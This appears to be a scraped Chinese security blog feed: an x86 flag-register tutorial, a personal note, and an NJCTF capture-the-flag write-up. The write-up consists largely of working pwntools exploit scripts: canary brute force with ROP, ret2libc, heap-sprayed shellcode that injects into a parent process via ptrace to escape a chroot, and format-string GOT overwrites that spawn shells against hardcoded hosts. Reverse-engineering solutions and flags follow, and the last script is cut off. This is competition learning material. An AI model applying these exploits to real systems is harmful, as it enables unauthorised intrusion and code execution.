<p>9个标志寄存器可以分为两组，第一组6个标志寄存器主要受加减运算和逻辑运算结果的影响，称为运算结果标志，第二组标志不受运算结果的影响，称为状态控制标志。</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/9%E6%A0%87%E5%BF%97%E4%BD%8D%E5%88%86%E4%B8%A4%E7%BB%84.png" alt=""></center>

<h5 id="1-进位标志CF-Carry-Flag"><a href="#1-进位标志CF-Carry-Flag" class="headerlink" title="1.    进位标志CF(Carry Flag)"></a>1.    进位标志CF(Carry Flag)</h5><p>   进位标志CF主要用来反映运算是否产生进位或借位。如果运算结果的最高位产生了一个进位或借位，那么，其值为1，否则其值为0。</p>
<h5 id="2-奇偶标志PF-Parity-Flag"><a href="#2-奇偶标志PF-Parity-Flag" class="headerlink" title="2. 奇偶标志PF(Parity Flag)"></a>2. 奇偶标志PF(Parity Flag)</h5><p>   奇偶标志PF用于反映运算结果中“1”的个数的奇偶性。如果“1”的个数为偶数，则PF的值1，否则其值为0  </p>
<h5 id="3-辅助进位标志AF-Auxiliary-Carry-Flag"><a href="#3-辅助进位标志AF-Auxiliary-Carry-Flag" class="headerlink" title="3. 辅助进位标志AF(Auxiliary Carry Flag)"></a>3. 辅助进位标志AF(Auxiliary Carry Flag)</h5><p>   在发生下列情况时，辅助进位标志AF的值被置为1，否则其值为0：<br>   (1)、在字操作时，发生低字节向高字节进位或借位时；<br>   (2)、在字节操作时，发生低4位向高4位进位或借位时。</p>
<h5 id="4-零标志ZF-Zero-Flag"><a href="#4-零标志ZF-Zero-Flag" class="headerlink" title="4. 零标志ZF(Zero Flag)"></a>4. 零标志ZF(Zero Flag)</h5><p>   零标志ZF用来反映运算结果是否为0。如果运算结果为0，则其值为1，否则其值为0。在判断运算结果是否为0时，可使用此标志位</p>
<h5 id="5-符号标志SF-Sign-Flag"><a href="#5-符号标志SF-Sign-Flag" class="headerlink" title="5. 符号标志SF(Sign Flag)"></a>5. 符号标志SF(Sign Flag)</h5><p>   符号标志SF用来反映运算结果的符号位，它与运算结果的最高位相同。在微机系统中，有符号数采用补码表示法，所以，SF也就反映运算结果的正负号。运算结果为正数时，SF的值为0，否则其值为1  </p>
<h5 id="6-溢出标志OF-Overflow-Flag"><a href="#6-溢出标志OF-Overflow-Flag" class="headerlink" title="6. 溢出标志OF(Overflow Flag)"></a>6. 溢出标志OF(Overflow Flag)</h5><p>   溢出标志OF用于反映有符号数加减运算所得结果是否溢出。如果运算结果超过当前运算位数所能表示的范围，则称为溢出，OF的值被置为1，否则，OF的值被清为0（“溢出”和“进位”是两个不同含义的概念）</p>
<h5 id="7-中断允许标志IF-Interrupt-enable-Flag"><a href="#7-中断允许标志IF-Interrupt-enable-Flag" class="headerlink" title="7. 中断允许标志IF(Interrupt-enable Flag)"></a>7. 中断允许标志IF(Interrupt-enable Flag)</h5><p>   中断允许标志IF是用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求。但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。具体规定如下<br>   (1)、当IF=1时，CPU可以响应CPU外部的可屏蔽中断发出的中断请求；<br>   (2)、当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求</p>
<h5 id="8-追踪标志TF-Trap-Flag"><a href="#8-追踪标志TF-Trap-Flag" class="headerlink" title="8. 追踪标志TF(Trap Flag)"></a>8. 追踪标志TF(Trap Flag)</h5><p>   当追踪标志TF被置为1时，CPU进入单步执行方式，即每执行一条指令，产生一个单步中断请求。这种方式主要用于程序的调试。</p>
<h5 id="9-方向标志DF-Direction-Flag"><a href="#9-方向标志DF-Direction-Flag" class="headerlink" title="9. 方向标志DF(Direction Flag)"></a>9. 方向标志DF(Direction Flag)</h5><p>   方向标志DF用来决定在串操作指令执行时有关指针寄存器发生调整的方向。具体规定在第5.2.11节——字符串操作指令——中给出。在微机的指令系统中，还提供了专门的指令来改变标志位DF的值</p>
<center><img src="http://otc7tld02.bkt.clouddn.com/%E6%A0%87%E8%87%B4%E5%AF%84%E5%AD%98%E5%99%A8.png" width="400" hight="300" alt=""></center>

<h3 id="2-主要指令"><a href="#2-主要指令" class="headerlink" title="2. 主要指令"></a>2. 主要指令</h3><p> 汇编中的指令可以参照这个网址进行学习（也涉及了上面的寄存器知识点）：<br>  <a href="http://www.freebuf.com/news/others/86147.html" target="_blank" rel="external">http://www.freebuf.com/news/others/86147.html</a></p>
<p> 在参加夏令营跟着读汇编呢也遇到了一些难以理解的内容：</p>
<p>  movsb：即字符串传送指令，这条指令按字节传送数据。通过SI和DI这两个寄存器控制字符串的源地址和目标地址，比如DS:SI这段地址的N个字节复制到ES:DI指向的地址，复制后DS:SI的内容保持不变。</p>
<p>  cld:（CLear Direction flag）则是清方向标志位，也就是使DF的值为0，在执行串操作时，使地址按递增的方式变化，这样便于调整相关段的的当前指针。这条指令与STD（SeT Direction flag）的执行结果相反，即置DF的值为1。</p>
<p>  Rep:指令就是“重复”的意思，术语叫做“重复前缀指令”，因为既然是传递字符串，则不可能一个字（节）一个字（节）地传送，所以需要有一个寄存器来控制串长度。这个寄存器就是CX，指令每次执行前都会判断CX的值是否为0（为0结束重复，不为0，CX的值减1），以此来设定重复执行的次数。因此设置好CX的值之后就可以用REP MOVSB了。</p>
]]></content>
      
        <categories>
            
            <category> reverse </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 堆栈及汇编基础 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[定一个小目标]]></title>
      <url>/2017/06/26/%E5%AE%9A%E4%B8%80%E4%B8%AA%E5%B0%8F%E7%9B%AE%E6%A0%87/</url>
      <content type="html"><![CDATA[<p>这是一个小目标。</p>
<a id="more"></a>
<p>今天，算是我的blog的第二个生日吧，在2016第一次搭建成功之后便在没有怎么管理过它，只是僵硬的往上传一些做题的writeup，那为什么还要搭建它，直接做一个笔记不就好了?</p>
<p>上周的聚会中和已经工作的学长作了一次深入的交谈，让我了解到了blog的重要，好好对待，它也许能助你成功，不好好对待它也就是一个高级一点的笔记本，恐怕也只有你自己能够进行阅读，毫无意义。</p>
<p>从前天开始对我的blog进行了主题修改，对一些小功能进行了完善，自行添加了一些小的插曲，自此，要求不高，多多上传一些自己的见解，把blog利用起来，学习之路还要继续向前。</p>
]]></content>
      
        <categories>
            
            <category> others </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[NJCTF writeup总结]]></title>
      <url>/2017/03/17/NJCTF-writeup%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p>NJCTF上大牛们整理出来的解题思路，我给总结下。</p>
<a id="more"></a>
<h3 id="PWN-messagner"><a href="#PWN-messagner" class="headerlink" title="PWN-messagner"></a>PWN-messagner</h3><hr>
<p>一开始以为是ssp-leak后来发现是逐个逐个爆破cannary，然后rop就没了,本来在找rop的，结果发现出题人留了rop链在里面。</p>
<pre><code>#coding:utf-8
from pwn import * 
#__author__=&apos;simp1e&apos;
import struct
import binascii    
PROC_NAME=&apos;./messager&apos;#PORC_NAME
context.arch=&apos;i386&apos;
proc_elf=ELF(PROC_NAME)
print proc_elf.checksec()
context.log_level = &apos;debug&apos;
for i in proc_elf.libs:
    if i.find(&apos;libc.so.6&apos;)!=-1:
        LOCAL_LIBC_PATH=i
L_LIBC=ELF(LOCAL_LIBC_PATH)


def exp(io,choice,libc):
    ll=log
    global code_base
    global cookies
    ll.debug(&apos;get_libc_offset&apos;)
    for i in libc.search(&apos;/bin/sh&apos;):
        offset_bin_sh=i
        break
    offset_system=libc.symbols[&apos;system&apos;]
    offset_one_function=libc.symbols[&apos;puts&apos;]
    print &apos;[offset]&apos;
    print &apos;sys-&gt;0x%x\nbinsh-&gt;0x%x\nputs-&gt;0x%x&apos;%(offset_system,offset_bin_sh,offset_one_function)
    cookies=&apos;\x00\xc1\xa6\x43\xe3\x04\x69\xa0&apos;
    cookies=&apos;\x00\x60\x58\xd8\x67\xaa\x83\x1e&apos;#006058d867aa831e
    iip=&apos;127.0.0.1&apos;
    port=5555
    if choice==2:
        iip=&apos;218.2.197.234&apos;
        port=2090
        cookies=&apos;\x00\xa0\xd7\x1c\x73\x4e\x74\x22&apos;#00bd4af811ae0e38
    pop_rsi_2ret=0x0000000000400fb1
    pop_edi_ret=0x0000000000400fb3
    while 1:
        if len(cookies)==8:
            break
        for i in range(1,0xff):
            data=io.recv()
            #print &apos;ddd&apos;+data
            data=p64(0x602160)*13+cookies+chr(i)
            print &apos;try----%d&apos;%(i)
            &apos;&apos;&apos;
            if choice==3:
                raw_input(&apos;gdb attach!!!&apos;)
            #&apos;&apos;&apos;
            io.send(data)
            try:
                io.recv()
                cookies+=&apos;%c&apos;%(i)
                print &apos;leak-&gt;cookies-&gt;&apos;+cookies.encode(&apos;hex&apos;)
                #raw_input(&apos;---------&apos;)
                io.close()
                io=remote(iip,port)
                break
            except Exception, e:
                io.close()
                io=remote(iip,port)
                continue
            io.close()
            io=remote(iip,port)
            #io.interactive()
    #+p64(0x400eb0)+p64(0x602160)*0x1
    print &apos;0x%x&apos;%(u64(cookies))
    n_rbp=0x7ffcb0dd5a80
    dd=p64(0x602160)*13+cookies+p64(n_rbp)
    rop = ROP(PROC_NAME)
    rop.call(proc_elf.plt[&apos;send&apos;],[0x602120,0x602160,0x100,0])
    print rop.dump()
       real_rop=p64(pop_edi_ret)+p64(0x602120)+p64(pop_rsi_2ret)+p64(0x40108a)+p64(0x602160)+p64(proc_elf.plt[&apos;send&apos;])+p64(0x400)
    data=dd+p64(0x400bc6)
    #&apos;&apos;&apos;
    if choice==3:
        raw_input(&apos;gdb attach!!!&apos;)
    #&apos;&apos;&apos;

    io.sendline(data)
    io.interactive()



if __name__==&apos;__main__&apos;:
       print &apos;Press 1 to test on local\nPress 2 to remote pwn\nPress 3 to test nc on local&apos;
    try:
        choice=int(raw_input(&apos;input &gt;&apos;).strip(&apos;\n&apos;))
    except:
        print &apos;Press error,Choice default set to 1&apos;
        choice=1
    if choice==1:
        r= process(PROC_NAME)
        exp(r,choice,L_LIBC)
    elif choice==2:
        r= remote(&apos;218.2.197.234&apos; , 2090 )
        #r= process(PROC_NAME)
        try:
            R_LIBC=ELF(&apos;./remote_libc&apos;)
        except:
            R_LIBC=L_LIBC
            print &apos;Alert! remote libc no found,default set to local libc&apos;
        exp(r,choice,R_LIBC)
    elif choice==3:
        r=remote(&apos;127.0.0.1&apos;,5555)
        exp(r,choice,L_LIBC)
</code></pre><h3 id="pwn-233"><a href="#pwn-233" class="headerlink" title="pwn-233"></a>pwn-233</h3><hr>
<p>有libc就行了，然后爆破就行，反正32嘛</p>
<pre><code>import time

from pwn import *
context.log_level = &apos;debug&apos;
libc_base = 0xf772f000#brute

offse_sys = libc_base + 0x3fe70
offse_bsh = libc_base + 0x0015da8c

def exp():
    io = remote(&apos;106.14.22.20&apos;, 23743)

    payload = &apos;c&apos;*0x16 + p32(offse_sys) + &apos;a&apos;*4 + p32(offse_bsh)
    io.sendline(payload)
    sleep(2)
    io.sendline(&apos;echo simp1e&apos;)
    d = io.recv(timeout=1)
    if &apos;simp1e&apos; not in d:
        io.close()
        return


    print &apos;!!!!!!&apos;
    io.interact()

if __name__ == &apos;__main__&apos;:
    tt=0
    while 1:
        print &apos;tyyy:%d&apos;%(tt)
        tt += 1
        try:
            exp()
        except:
            pass
</code></pre><p>NJCTF{W0W_Vd50_i5_C00L!!}</p>
<h3 id="PWN-vegas"><a href="#PWN-vegas" class="headerlink" title="PWN-vegas"></a>PWN-vegas</h3><hr>
<p>题目不难。想到思路之后就是写脚本的事情了。</p>
<p>一个猜数字奇偶的游戏。猜对了就能向数组里写一个字节。数字的生成方式是以时间为种子生成的16个初始随机数，然后再以一个稀奇古怪的算法生成的数字。不过好在每一次猜测随机数的时候都会给出随机数的值。所以只要爆破时间种子，然后以相同的随机数生成算法来计算就能够预测随机数了</p>
<p>（我能吐槽服务器时间很本机差了大概2500秒吗?异空间中的服务器？）</p>
<p>一旦能预测随机数，这个题目就是一个简单的栈溢出了。就是在main函数结尾的时候有一句<br><img src="http://p1.bpimg.com/567571/6dc7f3040aab2ffa.png" alt=""></p>
<p>esp的值是根据ecx的值确定的。额ecx又是从栈里面pop出来的。而栈里的值因为溢出而被覆盖了。不过也不麻烦，因为<br><img src="http://p1.bqimg.com/567571/046473b938f7988b.png" alt=""></p>
<p>这个puts会把栈里面的值给输出出来。溢出的时候找好位置读取一下栈的位置就好了。</p>
<pre><code>from pwn import *
import v
import ctypes
import time


context.log_level = &apos;debug&apos;
target = process(&apos;./vegas&apos;)
#target = remote(&apos;218.2.197.235&apos;,23747)
t = [0 for i in range(16)]
s = 0xb


def init(seed):
    s = 0xb
    libc = ctypes.cdll.LoadLibrary(&apos;./libc.so.6&apos;)
    libc.srand(seed)
    for i in range(16):
    t[i] = libc.rand()


def get_ran():
    global s
    global t
    v0 = s
    v1 = t[s]
    v2 = (s+15)&amp;0xf
    v3 = t[(s+13)&amp;0xf]
    v4 = t[v2]
    v5 = t[s] &lt;&lt; 16
    v5 = v5 &amp; 0xffffffff
    s = (s+15)&amp;0xf
    v6 = v3^v5^v1^(v3&lt;&lt;15)
    v6 = v6 &amp; 0xffffffff
    v7 = t[(v0+9)&amp;0xf]^(t[(v0+9)&amp;0xf]&gt;&gt;11)
    t[(v0+10)&amp;0xf] = v7^v6
    r = ((8*(v7^v6))&amp;0xDEADBEE8)^(v7&lt;&lt;24)^(v6&lt;&lt;10)^v7^v4^(2*v4)
    r = r &amp; 0xfffffff
    t[v2] = r
    return r


def guess(i,data):
    ss = &apos;&apos;
    target.recvuntil(&apos;Choice:\n&apos;)
    target.sendline(&apos;1&apos;)
    target.recvuntil(&apos;3. Not sure\n&apos;)
    target.sendline(str(i))
    target.recvuntil(&apos;The number is &apos;)
    num = target.recvline()
    num = int(num[:-1],16)
    r = target.recvline()
    if &apos;Right&apos; in r:
        target.recvuntil(&apos;step:\n&apos;)
        target.sendline(data)
        ss = target.recvline()
    target.recvuntil(&apos;score: &apos;)
    s = target.recvline()
    s = int(s[:-1])
    return num,s,ss
def win(data):
    if get_ran()&amp;1 == 1:
        return guess(1,data)[2]
    else:
        return guess(2,data)[2]
def lose():
    if get_ran()&amp;1 == 1:
        guess(2,&apos;1&apos;)
    else:
        guess(1,&apos;1&apos;)


ran,score,tmp = guess(1,&apos;1&apos;)
seed = int(time.time())+10000
while True:
    init(seed)
    if get_ran() == ran:
        break
    else:
        seed -= 1


if score == 1:
    lose()
else:
    win(&apos;1&apos;)
elf = ELF(&apos;./vegas&apos;)
rop = ROP(elf)
rop.read(0,0x0804B0C0,16)
rop.system(0x0804B0C0)


data = &apos;a&apos;*31# + &apos;b&apos;*12 + str(rop)
for i in data:
    win(i)


addr = win(&apos;a&apos;)
print addr
raw_input()
addr = addr[32:36]
addr = u32(addr) - 20
data2 = p32(addr+4) + &apos;aaaa&apos; + p32(addr+4) + str(rop)
for i in data2:
    win(i)


target.sendline(&apos;3&apos;)
target.sendline(&apos;/bin/sh;\x00&apos;)
target.interactive()
</code></pre><h3 id="PWN-syscallhelper"><a href="#PWN-syscallhelper" class="headerlink" title="PWN-syscallhelper"></a>PWN-syscallhelper</h3><hr>
<p>题目本身漏洞不难。主要考验写shellcode的功底。<br><img src="http://p1.bpimg.com/567571/ea494dd756dc45e0.png" alt=""></p>
<p>这里的索引可以为负数。写个-10就就可以覆盖到虚表了。覆盖虚表的指针指向的内容还是可控的。</p>
<p>首先写个指向puts指针进去，然后调用一下就可以获得到堆的地址。然后再覆盖一次虚表指向堆上的shellcode就可以了。这里有一个问题是本地和远程的堆偏移不太一样。远程因为有默认的syscall table。所以偏移和本地不一样。解决方法也很简单，直接堆喷shellcode然后稍微跑一下偏移就能解决了。</p>
<p>恩，shellcode是可以执行了。但是chroot还是个问题。写了一个列目录的shellcode，发现flag不在jail目录下。好吧，还得绕过chroot去上层目录才行。</p>
<p>写shellcode用getuid确认了远程进程的权限是root。而chroot对当前进程和其子进程是无解的。那就只能对父进程下手了。最后写个一个ptrace的shellcode。通过调试父进程，将shellcode注入父进程的方法来让父进程弹shell。最终搞到了flag。</p>
<pre><code>from pwn import *

context.log_level = &apos;debug&apos;

shellcode = &apos;&apos;

shellcode += asm(shellcraft.i386.linux.echo(&apos;123&apos;))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(0x10, &apos;edi&apos;, 0,0))

shellcode += asm(shellcraft.i386.linux.push(&apos;eax&apos;))

shellcode += asm(shellcraft.i386.linux.write(1,&apos;esp&apos;,4))

shellcode += asm(shellcraft.i386.linux.waitpid(-1,0,2))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*0, 795371626))


shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*1, 1752379183))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*2, 1852400175))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*3, 2304248682))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*4, 2580099555))

shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(5, &apos;edi&apos;, 0x08049B0F + 4*5, 16875725))





shellcode += asm(&apos;mov edi,[0x0804E158]&apos;)

shellcode += asm(&apos;add edi, 1&apos;)

shellcode += asm(shellcraft.i386.linux.ptrace(0x11, &apos;edi&apos;, 0, 0))

#shellcode += asm(shellcraft.i386.infloop())



#t = process(&apos;./syscallhelper&apos;)

t = remote(&apos;218.2.197.234&apos;, 2088)

def leave():

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;5&apos;)

    t.recvuntil(&apos;length\n&apos;)

    t.sendline(&apos;16384&apos;)

    t.recvuntil(&apos;message\n&apos;)

    t.sendline(&apos;\x90&apos;*(16380-len(shellcode))+shellcode)

def add(name,addr):

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;2&apos;)

    t.recvuntil(&apos;name\n&apos;)

    t.sendline(name)

    t.recvuntil(&apos;number\n&apos;)

    t.sendline(&apos;3343&apos;)

    t.recvuntil(&apos;count(argc)\n&apos;)

    t.sendline(&apos;-10&apos;)

    t.recvuntil(&apos;0 to stop\n&apos;)

    t.sendline(&apos;-10&apos;)

    t.recvuntil(&apos;value\n&apos;)

    t.sendline(p32(addr))

    t.recvuntil(&apos;0 to stop\n&apos;)

    t.sendline(&apos;0&apos;)


def call(name):

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;1&apos;)

    t.recvuntil(&apos;call name:\n&apos;)

    t.sendline(name)

    t.recvuntil(&apos;option:\n&apos;)

    t.sendline(&apos;3&apos;)

for i in range(5):

    leave()

add(&apos;explorer&apos;,0x08048D30)

call(&apos;explorer&apos;)

heap = t.recv(4)

heap = u32(heap) - 0xd0

print hex(heap)

shell = heap + 0x1 + 0x10000*3

add(&apos;explorer1&apos;,shell)

call(&apos;explorer1&apos;)

t.interactive()
</code></pre><h3 id="PWN-vsvs"><a href="#PWN-vsvs" class="headerlink" title="PWN-vsvs"></a>PWN-vsvs</h3><hr>
<p>先爆破code，得到第一层code为22，然后有个溢出，直接传/bin/sh就能拿flag了：</p>
<pre><code>#!/usr/bin/python
# -*- coding: utf-8 -*-


from pwn import *
import time

REMOTE = 0
LOCAL_REMOTE = 1
LOCAL = 2

rhost = &quot;218.2.197.235&quot;
rport = 23749 


flag = REMOTE
debug = 0

def GetConnection():
    if flag == LOCAL_REMOTE:
        conn = remote(lhost,lport)
        libc_addr = libc_addr_local
    elif flag == REMOTE:
        conn = remote(rhost,rport)
        libc_addr = libc_addr_remote
    elif flag == LOCAL:
        conn = process(local_bin)
        libc_addr = libc_addr_local
    return conn,libc_addr


exp = 1024*&quot;d&quot; + &quot;/bin/sh&quot;
conn,libc_addr = GetConnection()
conn.sendlineafter(&quot;access code:\n&quot;,&quot;22&quot;)
conn.sendlineafter(&quot;input:&quot;,exp)
conn.sendlineafter(&quot;?&quot;,exp)
conn.interactive()
</code></pre><h3 id="PWN-pingme"><a href="#PWN-pingme" class="headerlink" title="PWN-pingme"></a>PWN-pingme</h3><hr>
<p>又是一个没有给二进制程序的题目…首先要想办法把二进制文件dump下来。测试了一下发现存在格式化字符串漏洞</p>
<p>于是写个脚本把二进制程序给弄出来</p>
<pre><code>from pwn import *

import os

io = remote(&apos;218.2.197.235&apos;,23745)

context.log_level = &apos;debug&apos;


def get_content(addr):

    io.sendline(p32(addr) + &apos;%7$s&apos;)

    io.recvuntil(p32(addr))

    content = io.recvuntil(&apos;\n&apos;)[:-1]

    return content



io.recvuntil(&apos;Ping me\n&apos;)



fp = open(&apos;./pingme&apos;, &apos;ab+&apos;)

idx = 0x8048000 + os.path.getsize(&apos;./pingme&apos;) 

#idx = 0x8048001

#fp.write(&apos;\x7f&apos;)

while True:

    if idx &amp; 0xff == 00 or idx &amp; 0xff == 10:

        fp.write(&apos;\x00&apos;)

        idx += 1

        continue

    ans =  get_content(idx)

    if ans:

        fp.write(ans)

        idx += len(ans)

    else:

        fp.write(&apos;\x00&apos;)

        idx += 1
</code></pre><p>然后dump出来的程序不知道为什么没有plt……有点麻烦，勉强能看</p>
<p>简单的存在一个printf。直接利用这个就可以得到shell</p>
<pre><code>from pwn import *
import os


io = remote(&apos;218.2.197.235&apos;,23745)
context.log_level = &apos;info&apos;


def get_content(addr):
io.sendline(p32(addr) + &apos;%7$s&apos;)
io.recvuntil(p32(addr))
content = io.recvuntil(&apos;\n&apos;)[:-1]
return content

io.recvuntil(&apos;Ping me\n&apos;)
printf_got = 0x8049974
read_got = 0x8049978
puts_got = 0x8049980
strlen_got = 0x8049988


printf_libc = u32(get_content(printf_got)[:4])
log.info(&apos;printf :&apos; + hex(printf_libc))
read_libc = u32(get_content(read_got)[:4])
log.info(&apos;read :&apos; + hex(read_libc))
puts_libc = u32(get_content(puts_got)[:4])
log.info(&apos;puts :&apos; + hex(puts_libc))
#strchr_libc = u32(get_content(strchr_got)[:4])
#log.info(&apos;strchr :&apos; + hex(strchr_libc))


system_libc = printf_libc - 0x00049020 + 0x0003a940
print hex(system_libc)
high = (system_libc &gt;&gt; 16) &amp; 0xffff
low = (system_libc &amp; 0xffff)
print hex(high), hex(low)


#payload = &apos;%0&apos; + str((system_libc &amp; 0xffff) - 4) + &apos;x&apos; + p32(strlen_got) + &apos;%9$hn&apos;
payload  = &apos;%&apos; + str(low - 4).rjust(6, &apos;0&apos;) + &apos;x&apos; + p32(strchr_got) 
payload += &apos;%9$hn&apos;
payload += &apos;%&apos; + str(high - low - 4).rjust(5, &apos;0&apos;) + &apos;x&apos; + p32(strlen_got + 2)
payload += &apos;%13$hn&apos;
pause()
print payload
io.sendline(payload)
print io.recvuntil(&apos;\n&apos;)
io.sendline(&apos;/bin/sh &apos;)
io.interactive()
</code></pre><h3 id="RE-first"><a href="#RE-first" class="headerlink" title="RE-first"></a>RE-first</h3><hr>
<p>首先逆向一下程序，发现是和时间有关，并且和输入有关的。我们必须得想办法确定输入才行。</p>
<p>程序创建了6个线程，每个线程对input的4位进行MD5了之后取前16位和602120位置的数值进行比较<br><img src="http://i1.piimg.com/567571/e5ab5b359c4835bb.png" alt=""><br><img src="http://i1.piimg.com/567571/f1a0b4d1c1556ff9.png" alt=""></p>
<p>我们可以解出这些md5<br>然后在比较的位置下断点，恢复这些4个字母的字符串顺序，得到应该存在的输入<br>然后就是要爆破时间<br>我们写个脚本来实现</p>
<pre><code>import lowkey
import subprocess
import time
while True:
    p = subprocess.Popen(&apos;./first&apos;, stdout=subprocess.PIPE, stdin = subprocess.PIPE)
    out, _ = p.communicate(input = b&apos;juhuhfenlapsiuerhjifdunu\n&apos;)
    if &apos;Here&apos; in out:
        print out
    time.sleep(0.1)
</code></pre><p><img src="http://p1.bpimg.com/567571/c30558cf5f5a43ce.png" alt=""></p>
<h3 id="RE-echo-sever"><a href="#RE-echo-sever" class="headerlink" title="RE-echo sever"></a>RE-echo sever</h3><hr>
<p>这个题目比较的简单，实际上就是IDA解析的时候把数据解析成指令了。我们手动恢复一下就好了。<br>有个strncmp的比较，比较下输入是不是F1@gA，是的话就输出这个字符串的md5。<br>输出的MD5就是flag</p>
<h3 id="RE-on-the-fly"><a href="#RE-on-the-fly" class="headerlink" title="RE-on the fly"></a>RE-on the fly</h3><hr>
<p>是一个用d语言写的程序<br>找这样一个脚本，跑一下就能得到结果<br><a href="https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/reverse/deedeedee-150/solve.py" target="_blank" rel="external">https://github.com/ctfs/write-ups-2016/blob/master/csaw-ctf-2016-quals/reverse/deedeedee-150/solve.py</a><br><img src="http://i1.piimg.com/567571/3a811f4eba481e67.png" alt=""></p>
<p>一共两个Activity，逻辑类似，通过对传入的参数进行计算，直接遍历</p>
<h3 id="apk-safebox"><a href="#apk-safebox" class="headerlink" title="apk-safebox"></a>apk-safebox</h3><hr>
<p>apk改之理解析出源代码最后看算法写出爆破脚本即可。</p>
<pre><code>for i in xrange(10000000,99999999):
    i1 = 10000000
    j=1
    n=1
    if ((abs(i / 1000 % 100-36 ) == 3) &amp; (i % 1000 % 584 == 0)):
            for k in (0,3):
            if (i / j % 10 == i / i1 % 10):
                for c1 in xrange(48,122):
                    for c2 in xrange(48,122):
                        for c3 in xrange(48,122):
                            if((c3 == i / 1000000)&amp;(c2 == i / 10000 % 100)&amp;(c1 == i / 100 % 100+10)):
                                print (c3)
                                print (c2)
                                print (c1)
        j=j*10
        i1=i1/10
</code></pre><h3 id="apk-LittleRotatorGame"><a href="#apk-LittleRotatorGame" class="headerlink" title="apk-LittleRotatorGame"></a>apk-LittleRotatorGame</h3><hr>
<p>临时学 科学上网:<a href="https://developer.android.com/reference/android/app/NativeActivity.html" target="_blank" rel="external">https://developer.android.com/reference/android/app/NativeActivity.html </a></p>
<p>从android_main函数的前面代码看出，这就是官网给的样例，通过获取的加速度传感器的数据然后搞搞搞 在调用模式下看到一堆的块以及各种调用看出这是用了O-LLVM混淆 各种摸索下，发现获取的传感器数据会传入 a_process(int, int, int)<br><img src="http://i1.piimg.com/567571/9d72bb1e6aef52d8.png" alt=""><br>然后把返回值存到R7进行对比某值 跟入 ，发现该函数返回的值取值在 之间 再看后面对比的地方</p>
<pre><code>.rodata:0000785C ; signed int *dword_785C[10]
.rodata:0000785C dword_785C DCD 2, 7, 5, 3, 2, 9, 4, 1, 3, 6 
</code></pre><p>也就是说在获取到传感器的数据后，会调用<code>a_process</code>函数进行处理然后将返回值跟一数组的值进行对比，一共10个数字，也就是会对比10次，但是有一个问题， 获取的数字在 之间，而对比的数组有7和9,</p>
<p>此时我们注意到边上还有一个<code>b_process</code>，查看调用</p>
<p><img src="http://p1.bqimg.com/567571/005c07496555a38e.png" alt=""></p>
<p>前面在调用 a_process 的时候将返回值存储在R7，这里会在调用完后进行判断，如果返回值是6，会调用b_process 虽然中间隔得有点远</p>
<p>再整理一遍就是，会不断获取传感器数据，将传感器数据传入a_process ，然后判断返回值，如果返回值是6，则调用 b_process ，并将结果跟6相 加，再返回跟数组对比，十次对比全部一样应该就可以输出Flag</p>
<p>接下来动态调试 直接使用IDA attach上应用，没有发现反调试，找到so的加载地址，静态分析出两个函数偏移，加上加载基址，按g跳过去下断点，然后慢慢边跑 代码边修改R0的值即可 在调用完后下断点<br>同样在 b_process 函数调用后一条指令下断点</p>
<p>中间出现好多条</p>
<pre><code>Nice,Go on! ctfer 
</code></pre><p>之后出现flag</p>
<pre><code>03-26 06:26:27.648: I/an-activity(16735): The flag is:njctf{PvrNa7iv3Al1} 
</code></pre><h3 id="apk-easycrack"><a href="#apk-easycrack" class="headerlink" title="apk-easycrack"></a>apk-easycrack</h3><p>不是很复杂的安卓逆向题。java层几乎没有什么东西，而lib库也提供了x86指令集的版本。所以其实就是个正常的逆向题而已。</p>
<p>java代码里面值得注意的代码只有这个messageMe。将apk的包名easycrack进行一次循环亦或。然后返回。</p>
<p><img src="http://p1.bqimg.com/567571/e64d0f37a40cdd03.png" alt=""></p>
<p>然后就是看看静态的parseText函数。</p>
<p><img src="http://i1.piimg.com/567571/2f2962f9ee3da6aa.png" alt=""></p>
<p>首先是将输入和messageMe的返回值做一次异或。这一段很简单。</p>
<p><img src="http://i1.piimg.com/567571/94c4021b8c6d04f2.png" alt=""></p>
<p>最后是一段rc4的代码。已经看到不下4次rc4了。一看这sbox的初始方式就是rc4了。</p>
<p>所以解密也很简单。rc4的加密和解密是一样的代码。异或之类的运算也是可逆的。掏出祖传的rc4解密脚本改一改就能出flag了。</p>
<pre><code>ram = &apos;I_am_the_key&apos;                                                                                                                                                          
def getstr(string):
        table = []
    for i in range(256):
        table.append(i)
    v10 = 0 
    for i in range(256):
        v10 = (table[i] + v10 + ord(ram[i%len(ram)]))%0x100
